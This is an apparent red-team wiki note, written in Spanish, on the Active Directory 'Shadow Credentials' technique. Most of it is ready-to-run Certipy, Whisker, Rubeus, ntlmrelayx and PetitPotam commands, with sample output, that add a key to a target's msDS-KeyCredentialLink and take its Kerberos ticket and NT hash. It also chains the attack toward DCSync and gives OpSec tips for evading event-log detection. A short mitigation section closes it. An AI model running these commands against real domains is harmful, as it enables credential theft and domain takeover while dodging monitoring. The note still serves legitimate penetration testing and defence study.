---
aliases:
  - msDS-KeyCredentialLink Abuse
  - Shadow Creds
  - KeyCredentialLink Attack
tags:
  - technique/privilege-escalation
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: Technique
linked:
  - "[[Active Directory Explotación]]"
  - "[[AD CS Abuse]]"
  - "[[NTLM Relay]]"
  - "[[Certipy]]"
  - "[[Rubeus]]"
---
# Shadow Credentials

---

## Cheatsheet
^shadow-credentials

| Paso | Comando | Contexto |
| --- | --- | --- |
| **Auto chain** | `certipy shadow auto -u atk -p pass -account VICTIM$ -dc-ip DC` | Un shot (setup + auth + cleanup) |
| **Manual add** | `certipy shadow add -u atk -p pass -account VICTIM$ -dc-ip DC` | Guardar cert.pfx |
| **Auth con cert** | `certipy auth -pfx victim.pfx -dc-ip DC` | TGT + NT hash |
| **Lista existente** | `certipy shadow list -u atk -p pass -account VICTIM$ -dc-ip DC` | Inspeccionar KeyCredentialLink |
| **Cleanup** | `certipy shadow clear -u atk -p pass -account VICTIM$ -dc-ip DC` | Borrar KCL agregado |
| **Whisker (Windows)** | `.\Whisker.exe add /target:VICTIM$` | On-host Windows |

---

## Concepto

`msDS-KeyCredentialLink` es un atributo LDAP introducido con Windows Hello for Business. Contiene public keys que permiten autenticación **PKINIT** (Kerberos con cert) de un user/computer.

Si el atacante tiene `GenericWrite` / `GenericAll` sobre el target:
1. Genera keypair propio.
2. Agrega su public key al `msDS-KeyCredentialLink` del target.
3. Autentica via PKINIT usando su private key → recibe TGT válido + NT hash del target.

**Ventaja sobre reset de password**:
- No cambia password del target (no rompe apps/services).
- Reversible (quita el KCL agregado).
- Menos ruidoso que `ForceChangePassword`.

## Requisitos

- AD CS desplegado con al menos una CA online con template **que soporte client auth** (default en dominios con NT CS).
- `GenericWrite` / `GenericAll` / `WriteProperty` sobre `msDS-KeyCredentialLink` del target.
- Dominio con functional level >= Windows Server 2016 (atributo introducido en 2016).
- Conectividad al DC (LDAP 389/636 + Kerberos 88).

## 1. Identificar target (BloodHound)

```cypher
MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddKeyCredentialLink]->(t)
RETURN p
```

O directamente:
```cypher
MATCH p=(u {owned:true})-[:AddKeyCredentialLink]->(t)
RETURN p
```

## 2. Certipy — auto chain

```bash
certipy shadow auto \
  -u attacker@dom.local -p 'Pass123' \
  -account 'VICTIM$' \
  -dc-ip 10.10.10.10
```

Output:
```
[*] Targeting user 'VICTIM$'
[*] Generating certificate
[*] Adding Key Credential with device ID '...' to the Key Credentials for 'VICTIM$'
[*] Successfully added Key Credential
[*] Authenticating as 'VICTIM$' with the certificate
[*] Using principal: VICTIM$@dom.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'VICTIM.ccache'
[*] Trying to retrieve NT hash for 'VICTIM$'
[*] Restoring the old Key Credentials for 'VICTIM$'
[*] Successfully restored the old Key Credentials
[*] NT hash for 'VICTIM$': aad3b435b51404eeaad3b435b51404ee
```

Resultado: NT hash + TGT del target.

## 3. Certipy — manual (más control)

```bash
# Add
certipy shadow add -u atk -p pass -account 'VICTIM$' -dc-ip DC
# → VICTIM.pfx

# Auth (en otro momento, o después de cleanup)
certipy auth -pfx VICTIM.pfx -dc-ip DC -domain dom.local -username 'VICTIM$'
# → TGT + NT hash

# Clear (opsec)
certipy shadow clear -u atk -p pass -account 'VICTIM$' -dc-ip DC
```

## 4. Con hash / ticket en lugar de password

```bash
# Con NT hash del atacante
certipy shadow auto -u atk -hashes :NTHASH -account 'VICTIM$' -dc-ip DC

# Con Kerberos ticket
export KRB5CCNAME=atk.ccache
certipy shadow auto -u atk -k -no-pass -account 'VICTIM$' -dc-ip DC -target DC.dom.local
```

## 5. Whisker (Windows on-host)

```powershell
# Add
.\Whisker.exe add /target:VICTIM$

# Output:
# [+] KeyCredentialLink added. Rubeus command:
# Rubeus.exe asktgt /user:VICTIM$ /certificate:BASE64_PFX /password:"..." /domain:dom.local /dc:DC.dom.local /getcredentials /show

# Auth con Rubeus
.\Rubeus.exe asktgt /user:VICTIM$ /certificate:BASE64_PFX /password:"PWD" /getcredentials

# Cleanup
.\Whisker.exe remove /target:VICTIM$ /devicecid:CID_FROM_ADD
```

## 6. Via NTLM Relay → Shadow Credentials

Si hay coercion disponible:

```bash
sudo ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target 'VICTIM$'

# Trigger (PetitPotam / PrinterBug / DFSCoerce)
PetitPotam.py -u '' -p '' ATTACKER VICTIM
```

## 7. Chains comunes

| Primitiva | Target | Resultado |
| --- | --- | --- |
| `AddKeyCredentialLink` sobre user | Shadow cred user | NT hash del user |
| `GenericWrite` sobre computer | Shadow cred computer | NT hash + TGT computer → lateral |
| `GenericAll` sobre DC$ | Shadow cred DC | Hash DC → DCSync |
| RBCD + Shadow | Computer bajo control | Impersonation arbitraria |

## 8. OpSec

- Uso de PKINIT genera evento **4768** con "Certificate Information" presente (anómalo para cuentas que no usan Smart Card normalmente).
- `msDS-KeyCredentialLink` modification → evento **5136** (si auditing habilitado).
- Auto chain de Certipy revierte KCL automáticamente — preferir sobre manual si evasión importa.
- Evitar en cuentas con audit logging estricto (DA, DCs).

## Mitigaciones (blue)

- Auditar cambios sobre `msDS-KeyCredentialLink` (SACL).
- Restringir quién puede escribir este atributo (no default para `SELF` en computers).
- Detecciones: PKINIT auth desde host que no debería usar certs (baseline).

## Recursos

- [Certipy Wiki - Shadow Credentials](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Shadow-Credentials)
- [Whisker](https://github.com/eladshamir/Whisker)
- [Elad Shamir - Shadow Credentials paper](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec)

---
